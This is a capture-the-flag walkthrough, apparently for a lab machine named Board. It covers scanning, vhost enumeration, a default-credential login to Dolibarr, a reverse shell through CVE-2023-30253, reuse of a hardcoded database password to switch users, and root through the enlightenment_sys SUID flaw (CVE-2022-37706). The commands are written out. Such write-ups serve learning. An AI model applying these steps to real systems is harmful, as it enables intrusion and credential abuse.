Running an aggressive TCP port scan using the command sudo nmap -sV -A 10.129.66.195 -p 22,80 returns the result shown in the output above. The target machine is running OpenSSH 8.2p1 SSH application on port 22. And Apache httpd 2.4.41 as the web server on port 80.

Enumeration

Port 80: HTTP

The webpage shown in the picture above is returned for this web application on port 80. I checked the source-code of the web application and identified the email: info@board.htb. The board.htb could be a potential hostname. Before enumerating the application any further, such as performing a directory search, I added the hostname board.htb in my /etc/hosts file.


I ran a vhost enumeration by using the command ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.board.htb" -u http://board.htb -fw 6243 and obtained the two results, crm and blacklist, as shown in the image above. After inserting the two more hostnames inside my /etc/hosts file, it contains the entry 10.129.66.195 blacklist.board.htb crm.board.htb board.htb. Time to check them out.


I browsed to http://crm.board.htb and the login webpage shown in the picture above was returned to me. It contains the application name and version Dolibarr 17.0.0.


Using the default credentials admin:admin, I gained access to the web application as shown in the picture above. However, it mentions my access as admin is limited. I tried further enumeration, but I didn't find anything. According to this great technical article, the Dolibarr 17.0.0 is vulnerable to Command Injection attack (CVE-2023-30253). This is handy as this exploit grants an authenticated attacker to obtain remote command execution using code injection. It even bypasses the application restrictions. When searching for any vulnerabilities for this application version, I came across this GitHub repository. I downloaded this exploit on my machine. Time to test it.

Exploitation

Owning the Dolibar 17.0.0 via Command Injection (CVE-2023-30253)


I started a listener on my machine first at port 8443, as shown in the picture above on the bottom terminal. And then I ran the command python3 exp.py http://crm.board.htb admin admin 10.10.14.89 8443 to deploy the exploit, as shown in the picture above on the top terminal. And bingo. I obtained a reverse shell connection on my machine at port 8443 with the session as www-data. Time to elevate my privileges.

Privilege Escalation

Horizontal Privilege Escalation: User www-data to User larissa via Hardcoded Password Inside conf.php


After some manual enumeration, I found the conf.php configuration file as shown in the picture above. It is located at /var/www/html/crm.board.htb/htdocs/conf. As shown in the picture above, the MySQL credentials are dolibarrowner:serverfun2$2023!!. One user exists on the machine called larissa. Since this is the only user created account, I sprayed this password against this user.


And got a hit as shown in the picture above. I managed to successfully switch to this user using the command su larissa and the password serverfun2$2023!!. Since this reverse shell session is not stable, I can use SSH to connect to the target machine as this new user.


Using the command ssh larissa@board.htb and the password serverfun2$2023!!, I gained access to the SSH as this new user. Now I have a stable foothold on the target machine as the user larissa.

Vertical Privilege Escalation: User larissa to User root via enlightenment_sys SUID Binary Flaw (CVE-2022-37706)

I transferred Linpeas to the target machine and executed it. After running the binary, I obtained the useful information shown in the picture above. On the target machine, the binary enlightenment_sys has SUID set.


After just checking for CVE-2022-37706, I obtained the result shown in the image above. This is a Local Privilege Escalation exploit which can be used to obtain a root shell. This exploit works due to a flaw the enlightenment_sys works. When looking for exploits, I came across this exploit at GitHub.


To test my luck, I browsed over to /tmp. Then I created a file called exp.sh using vi. Then I inserted the contents of exploit.sh as shown in the image above.


Then I changed the script to be executable using the command chmod +x exp.sh. Afterwards, I ran the command ./exp.sh. And instantly, I obtained a root shell on the target machine as shown in the picture above.
